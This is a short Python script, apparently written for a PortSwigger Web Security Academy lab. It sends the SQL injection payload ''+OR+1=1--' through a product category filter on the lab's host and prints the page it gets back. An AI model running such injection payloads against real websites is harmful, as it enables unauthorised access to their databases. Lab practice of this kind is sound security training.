import requests
from bs4 import BeautifulSoup

site = 'ac581f6a1e7b207380715c9900e0005d.web-security-academy.net'

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()
try_category("""'+OR+1=1--""")
